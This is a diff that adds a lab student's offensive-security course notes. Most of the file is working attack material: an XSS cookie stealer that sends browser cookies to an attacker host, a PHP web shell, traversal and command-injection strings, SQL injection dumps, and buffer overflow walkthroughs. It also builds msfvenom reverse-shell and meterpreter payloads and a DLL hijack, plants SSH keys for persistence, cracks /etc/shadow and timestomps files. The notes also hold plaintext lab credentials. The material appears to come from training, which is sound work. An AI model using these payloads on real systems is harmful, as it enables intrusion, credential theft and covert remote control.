@@ -1,0 +1,624 @@
+# Cross Site Script
+# create script
+<?php
+$cookie = $_GET["username"];
+$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+fwrite($steal, $cookie ."\n");
+fclose($steal);
+?>
+#upload COOKIE script to site
+# redirect to the upload location
+<script>document.location="http://10.100.28.40/uploads/cookie2.php?username=" + document.cookie;</script>
+
+
+
+-----------------------------------------------------------------------------------------
+## HTML Scrape DEMO
+-----------------------------------------------------------------------------------------
+https://quotes.toscrape.com/
+#!/usr/bin/python
+ 
+#### Required Imports ####
+import lxml.html
+import requests
+
+#### Websites to Scrape ####
+page = requests.get('http://quotes.toscrape.com')
+
+#### Don't Touch = Makes Page Human Readable Text ####
+tree = lxml.html.fromstring(page.content)
+
+#### TAG and ATTRIBUTE to Scrape! ####
+#### Change //<attribute> and @class ####
+tags = tree.xpath('//small[@class="author"]/text()')
+
+#### Print it all out ####
+print(tags)
+
+
+-----------------------------------------------------------------------------------------
+## SSH Tunnel Demo
+-----------------------------------------------------------------------------------------
+lin.internet	10.50.27.222		student:budder1234	XBC4Xq6BYExYjhi
+#### Control Sockets / Tunneling (multiplexing)
+ssh -MS /tmp/jump student@10.50.27.222		XBC4Xq6BYExYjhi
+ssh -S /tmp/jump dummy
+
+#### Dynamic Tunnel
+ssh -S /tmp/jump -O forward -D 9050 dummy
+#### Close Dynamic Tunnel
+ssh -S /tmp/jump -O cancel -D 9050 dummy
+
+
+Scan from jump box
+sudo proxychains nmap -Pn -T4 -sT -p1-10000 192.168.28.111 2>/dev/null
+
+
+#### Set up multiple tunnels
+ssh -S /tmp/jump -O forward -L 1111:192.168.28.111:80 dummy
+ssh -S /tmp/jump -O forward -L 2222:192.168.28.111:8080 dummy
+
+#### Set up tunnel through tunnel
+ssh -S /tmp/jump -O forward -L 3333:192.168.28.111:2222 dummy
+ssh -MS /tmp/T1 root@127.0.0.1 -p 3333
+
+#### Close Tunnels
+ssh -S /tmp/jump -O cancel -L 3333:192.168.28.111:2222 dummy
+student@lin-ops:/tmp$ ssh -S /tmp/jump -O cancel -L 2222:192.168.28.111:8080 dummy
+student@lin-ops:/tmp$ ssh -S /tmp/jump -O cancel -L 1111:192.168.28.111:80 dummy
+
+
+-----------------------------------------------------------------------------------------
+## Dev Console HTTP demo
+-----------------------------------------------------------------------------------------
+On Win-OPS google chrome, press f12 to open developer console
+Network Traffic tab is built in sniffer
+clicking on items will show http header information
+
+https://user-agents.net/lookup
+
+-----------------------------------------------------------------------------------------
+## Cross-site scripting Demo
+-----------------------------------------------------------------------------------------
+####Stored
+10.50.40.14/chat/messages.php
+
+# create cookie stealer on LinOps
+<?php
+$cookie = $_GET["username"];
+$steal = fopen("/home/student/cookies.txt", "a+");   <-- needs to be a place cookie.php can create a file
+fwrite($steal, $cookie ."\n");
+fclose($steal);
+?>
+
+#get the link to the server
+<script>document.location="http://10.50.23.130/cookie.php?username=" + document.cookie;</script>  <--- needs to be reachable by target
+
+else you could do keystroke logging, or catching items they send to the webserver
+
+
+#### Directory Traversal
+enter files to look for
+POST method
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../var/www/html/robots.txt
+../../../../usr/share/joe/lang/fr.po
+../../../../etc/host
+
+GET method
+10.50.40.14/path/pathdemo.php?myfile=../../../../etc/passwd
+
+
+#### Malicious Uploads
+10.50.40.14
+Create Malicious File
+  <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+
+upload the file
+find the file in /uploads
+run the file
+run commands
+	whoami	www-data = root
+	ls -latr /home/<user i am>
+	mkdir /home/<user>/.ssh
+	
+MAKE SSH KEYS TO LOG IN:
+ssh-keygen -t rsa
+cat /home/student/.ssh/id_rsa.pub
+echo "" >> /home/billybob/.ssh/authorized_keys
+cat /home/<user>/.ssh/authorized_keys
+## make tunnel to his ssh port and then login to the shell
+ssh -S /tmp/jump -O forward -L 7772:10.100.28.40:4444 dingus
+ssh billybob@localhost -p7772
+
+
+#### Command Injection
+run commands preceded by a semi-colon
+ ; whoami
+ ; cat /etc/passwd
+ ; ls -latr & netstat -rn
+ || ifconfig
+
+
+
+#### Upload SSH Key to Webserver
+find out what user you are: whoami
+find home directory and if you have shell: cat /etc/passwd or ../../../../etc/passwd
+Find/make .ssh directory in your home
+	ls -la /users/home/directory      #check if .ssh exists
+	mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+# on linops make your ssh key
+ssh-keygen -t rsa
+cat /home/student/.ssh/id_rsa.pub
+# add your key to the directory
+echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys	(entire thing)
+cat /users/home/directory/.ssh/authorized_keys
+#ssh as www-data
+ssh www-data@<ip>
+
+-----------------------------------------------------------------------------------------
+## SQL Demo
+-----------------------------------------------------------------------------------------
+SHOW DATABASES;
+USE session;
+show tables;
+select * from session.car;
+Select * from session.Tires UNION select name,type,cost,color from session.car;
+
+#### username/password sequel -> sometimes gives you nothing 
+POST METHOD
+user: ' or 1='1
+pass: ' or 1='1
+
+GET METHOD to grab variables and database information "Dumping the Database"
+F12 -> Network -> POST Request -> Raw Data -> URL?Raw Data
+http://10.50.21.3/login.php?username=%27+or+1%3D%271&passwd=%27+or+1%3D%271
+
+Potential SSH Creds
+#### ABOVE IS THE ONLY THING YOU CAN DO ON A LOGIN PAGE -> can only get usernames and passwords
+
+#### Pull out extra information - POST METHOD
+#STEP 1: Get the DATABASE to DUMP
+You must feed a valid option to use statements
+Ford' OR 1='1
+TRY ALL OPTIONS - The one the works will dump the entire database
+Audi' OR 1='1
+#STEP 2: FIND OUT HOW MANY COLUMNS IN THE TABLE
+Start with the amount of columns you have (placeholders)
+Audi' UNION SELECT 1,2,3,4;#
+Keep Trying until it works - FIND IF THERE ARE MISSING COLUMNS (2 is missing)
+Audi' UNION SELECT 1,2,3,4,5;#
+NOTE THE ORDER THEY APPEAR IN
+1,3,4,5
+#STEP 3: DO THE GOLDEN STATEMENT
+Change a few things to make it line up
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#
+Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#	modified line
+Audi' UNION SELECT id,2,name,pass,5 FROM session.user;#		Next line to get information from the relevant tables
+
+Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
+
+May have to perform multiple queries if you don't have enough columns
+
+
+#### Pull out extra information - Get METHOD
+Very similar - performed in the URL BAR (drop down menu is a dead giveaway, or buttons)
+#STEP 1: Test the database - test all (database to dump)
+select an option, then find the variable in the url and test it
+10.50.21.3/uniondemo.php?Selection=1 OR 1=1 ;#
+10.50.21.3/uniondemo.php?Selection=2 OR 1=1 ;#
+10.50.21.3/uniondemo.php?Selection=3 OR 1=1 ;#
+10.50.21.3/uniondemo.php?Selection=4 OR 1=1 ;#
+
+#STEP 2: FIND OUT HOW MANY COLUMNS IN THE TABLE
+10.50.21.3/uniondemo.php?Selection=2 UNION SELECT 1,2,3 ;#
+Note order they appear in
+1,3,2
+
+#STEP 3: DO THE GOLDEN STATEMENT
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#
+Note how I changed the position to match the order found in step 2
+10.50.21.3/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+
+10.50.21.3/uniondemo.php?Selection=2 UNION SELECT cost,year,color FROM session.car;#
+
+
+-----------------------------------------------------------------------------------------
+## Assembly Demo
+-----------------------------------------------------------------------------------------
+main:
+	mov rax, 16		# move 16 to rax
+	push rax		# put value in rax on top of stack
+	jmp mem2		# move to mem2:
+	
+mem1:
+	mov rax, 0		# Make rax equal 0
+	ret			# return rax
+
+mem2:
+	pop r8			# make r8 equal to top of stack, then remove that value from stack
+	cmp rax, r8		# rax - r8   (16 - 16)
+	jz mem1		# if equal, move to mem1:
+
+-----------------------------------------------------------------------------------------
+main:
+	lea rcx, 25	# lea -> fancy move, grabs what is at the address specified
+	lea rbx, 62	# rbx is now 62 
+	jmp mem1	# jump to mem1:
+	
+mem1:
+	sub rbx, 40	# subtract 40 from rbx, permanent change
+	lea rsi, rbx	# rsi becomes the value of rbx
+	cmp rcx, rsi	# compare rcx and rsi	(25-22)
+	jnz mem2	# jump if not 0, based off of the compare
+	jmp mem3	# jump to mem3 (this only gets read if the line above is incorrect/false
+
+mem2:
+	lea rax, 1	# make rax 1 (error)
+	ret		# return value of rax
+
+mem3:
+	lea rax, 0	# Make rax 0 
+	ret		# Return value of rax
+
+
+
+-----------------------------------------------------------------------------------------
+## Reverse Engineering Demo
+-----------------------------------------------------------------------------------------
+Use Ghidra
+import file
+Auto Analyze File
+Search using the search toolbar for a string you saw
+Find the function it uses to get input
+Find the value it needs to be to print success
+find the function that sets the value of the variable that needs to be set
+read the function for success
+OPEN EYES, LOOK, USE YOUR BRAIN
+
+
+-----------------------------------------------------------------------------------------
+## Reverse Engineering Demo ---- PATCHING
+-----------------------------------------------------------------------------------------
+Find the statement you want to change
+click patch instruction
+type what you want to change it to
+export file as PE
+run it
+
+
+-----------------------------------------------------------------------------------------
+## Exploit Development - Linux
+-----------------------------------------------------------------------------------------
+Step 1: Run the program to see how it works
+	Linux Programs can be interacted with in 2 ways, user input or parameters
+	
+Step 2: Overflow the program (Segmentation Fault)
+	hold a letter for a while to overflow
+	
+step 3: Use GDB to check if the file is overflowable - Only on the Linux Ops Station
+	pdisass main
+	check for function calls
+	pdisass <functions>
+	(look through the functions(green) to find a vulnerable function(red))
+
+Step 4: Confirm your function is vulnerable to buffer overflow
+	google it
+	"gets function vulnerable"
+	
+Step 5: Exploit Development
+	https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+
+Step 6: Find IP (instruction pointer)
+	create overflow python script (buff.py)
+	run the program with the output of the overflow script
+		gdb func
+		run <<< $(python buff.py)
+		OR
+		run $(python buff.py)
+
+	Then grab the Hex value of the pointer and put it into wiremask (website)
+	Then remake your script with the offset as the new amount for your overflow var
+	and rerun it to make sure you have control of the EIP
+
+Step 6: Find a valid EIP that exists on this machine (random memory addresses)
+	env - gdb func		# open environment-less gdb, no peda
+	show env		# we need to clear this
+	unset env LINES
+	unset env COLUMNS
+	show env		# should be empty
+	run			# run your program to overflow it manually
+		manual overflow of the machine (a bunch of letters in a row)
+	info proc map		# map out all memory
+	# find the start/end of the heap (the start addr one lower than the heap line)
+		find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
+
+	Grab multiple of the hex addrs that come up and put them in your script
+		#### Actual EIP in REVERSE ENDIAN #### 0xf7 f6 53 43
+		eip = "\x43\x53\xf6\xf7"
+	Add a NOP sled to ensure success
+		nop = "\x90" * 10
+
+	Create shellcode to send over
+		msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+	Add it to your python script
+
+Step 7: Troubleshooting
+	Check Variable names all being printed
+	Check endianness
+	double the nop sled (dont exceed 25)
+	regenerate Shellcode
+	change your eip
+	regenerate shellcode again
+
+Step 8: Run additional commands
+	msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b "\x00" -f python
+		Replace shellcode in script
+
+
+Step 9: Do it on the machine you want to exploit
+	MAKE SURE GDB is INSTALLED ON THE BOX
+	which gdb
+	step 6-8 to will be done on the target
+	write script to /tmp via copy/paste or via scp
+
+	./func <<< $(python script.py)
+	./func $(python script.py)
+
+
+-----------------------------------------------------------------------------------------
+## Windows Buffer Overflow
+-----------------------------------------------------------------------------------------
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+Step 1: On Winops, Get the server and dll file in the same location
+
+Step 2: Open the server/program and immunity debugger, then attach them
+	file > attach > program
+
+Step 3: On LinOps create your script to try and overflow the program
+	# windows buffer overflow program 1 #
+
+Step 4: Run the script on linops
+	python winbuff.py
+
+Step 5: On immunity debugger find the offset
+	CPU window, find registers > EIP
+	place that value into the offset on wiremask to get your offset value (2003)
+
+Step 6: Back on LinOps, single out the EIP (make sure you restarted server on immunity debugger, click reverse, then play)
+	# windows buffer overflow program 2 #
+	python winbuff.py
+	On immunity Debugger, the EIP should read 42424242 (all capital B)
+
+Step 7: In immunity on winops find suitable JMP ESP
+	!mona jmp -r esp -m "essfunc.dll"
+	window > log data to view the responses
+	copy the top address and input into your script (reverse endian)
+	# windows buffer overflow program 3 #
+
+	No Longer need Immunity Debugger
+
+Step 8: Add NOP SLED
+	buf += "\x90" * 10
+	
+Step 9: Create shellcode	lhost will be the machine you are having the target reach back to (linops)
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.130 lport=4444 -b "\x00" -f python
+		don't copy the buf = b""
+	# windows buffer overflow program 4 #
+
+Step 10: Set up msfconsole / meterpreter on LINOPS terminal
+	msfconsole
+	use multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost 0.0.0.0
+	set lport 4444
+
+Step 11: Run it all
+	Ensure your server is running on WinOps/Target
+	on LinOps > run winbuff.py #4
+	on MeterPreter > run
+	
+Step 12: Once it works on WinOps/LinOps, Fit it to your target IPs and Ports
+	Create tunnels to target
+	inside script, change who you send it to (localhost, tunnelport)
+	everything else should be good
+	
+meterpreter commands:
+	shell
+	
+Troubleshooting:
+	Change NOP sled to 20
+	regenerate shellcode
+	
+-----------------------------------------------------------------------------------------
+## Post Exploitation
+-----------------------------------------------------------------------------------------
+Just got on a box: (device verification)
+	hostname
+	whoami
+	ip a
+Ping sweep the network the box is in:
+	for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+	
+	cat /etc/hosts		# shows who else you're connected to
+	
+Extra Information Gathering:
+	ps -elf		# Is it remote logging (rsyslogd) / search for running scripts, read them (check if it's running on LinOps or not)
+				kaspersky norton antivirus rkhunter WindowsDefender	Search for antivirus running
+
+	ls -latr /etc		# see what is configured
+	ls -latr /var/log	# see logs
+	systemctl --type=service --no-pager
+
+	crontab -l
+	https://crontab.guru/
+	ls -latr /etc/cron*
+	/etc/cron.d
+	ls -latr /var/spool/cron/crontabs
+
+Always search directories: ITEMS MAY BE HIDDEN
+	/tmp
+	/home/<currentuser>
+	/home
+	find / -type f -iname ".*" 2>/dev/null	# use a . to search just the location you're in
+	
+Interesting Files:
+	
+	rootkit
+	ransomware
+	virus
+	trojan
+	worm
+	
+Sudo file:	Tells you what you can sudo
+	sudo -l
+	cat /etc/passwd (in sudo group?)
+	cat /etc/group | grep "username"
+
+rsyslog:
+	/etc/rsyslog.conf
+	ls -latr /etc/rsyslog.d
+		ufw.conf
+		default.conf	<- usually this one
+		cloudinit.conf
+	grep -v "#" /etc/rsyslog.d/50-default.conf
+	IF IT IS NOT GOING TO /var/log THAT IS SUS, LOOK AT IT
+
+Sniff Traffic:
+	tcpdump
+	
+Be sure that binary's have the executable bit set
+
+
+
+SCP DEMO:
+	ssh -MS /tmp/young student@10.50.37.30
+	scp -o "ControlPath=/tmp/young" randomtext:/home/student/file.txt . <---- dot means current directory on me
+	scp -o "socket made to machine" source destination
+
+
+-----------------------------------------------------------------------------------------
+## DLL INJECTION DEMO
+-----------------------------------------------------------------------------------------
+Find vulnerable executable:
+schtasks /query /fo LIST /v | select-string -Pattern "Task To Run" -CaseSensitive | select-string -pattern "COM Handler" -NotMatch
+
+Figure out version numbers - make sure it's vulnerable
+sigcheck <fullpath to exe>
+
+icacls - displays acls for a file
+icacls <full path to exe>
+            Checking for Full Access (F)
+            
+Open Procmon:
+Configure the following filters by pressing CTRL + L to open the filter menu:
+    Process Name contains putty.exe
+    Path contains .dll
+    Result contains NAME NOT FOUND
+
+Create payload on LinOps:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.23.130 LPORT=4444 -f dll > SSPICLI.dll
+
+Put payload on target machine in directory with vulnerable exe:
+scp WINMM.dll student@10.50.23.188:C:/users/student/desktop
+
+On LinOps, Open meterpreter:
+msfconsole
+use multi/handler
+set payload /windows/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+
+Finding Vulnerable Services:
+wmic service list full
+sc query
+
+Making the payload, find a service that can be renamed, rename it, then put out bad one with the original name in its spot
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.23.130 LPORT=4444 -f exe > <exename>.exe
+
+On LinOps, Open meterpreter:
+msfconsole
+use multi/handler
+set payload /windows/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+
+-----------------------------------------------------------------------------------------
+## Linux Privilege Escalation
+-----------------------------------------------------------------------------------------
+Try sudo priv esc
+	sudo -l
+	https://gtfobins.github.io/
+	Search for the commands you found and see if they are vulnerable
+
+Try SUID/SGID bits
+	Search for the bits being set: (SGID2, SUID4, BOTH6)
+	find / -type f -perm /2000 2>/dev/null
+	find / -type f -perm /4000 2>/dev/null
+	find / -type f -perm /6000 2>/dev/null
+	https://gtfobins.github.io/
+	Search for each binary found, MAKE SURE IT HAS AN EXPLOIT FOR WHATEVER BIT IT HAS SET!
+
+DOT. the path
+	The DOT. will already be there, you just need to take advantage of it
+	vim <binary>
+	chmod +x <binary>
+	
+	cat /etc/shadow > badfile.txt
+	
+john the ripper
+	user zeus -> crack this guy
+	/etc/shadow
+	grab his hash
+	You will find a password list on a machine
+	
+	sudo apt install john
+	user hash --> into own file
+	john --wordlist=<passwords.txt> <hashfile.txt>	
+	RECORD USERS/PASSWORDS AT ALL TIMES
+	john <hashfile.txt> --show
+	
+sudoers file
+	sudo vim /etc/sudoers
+	copy an entry from LinOps into the workstation you want? 
+	
+timestomp
+	touch -r <referencefile> <filetomodify>	
+
+
+Logs 3 for login 3 for logout
+	tail -n50 auth.log
+	timestamp analysis
+	pid analysis
+	
+-----------------------------------------------------------------------------------------
+## 
+-----------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
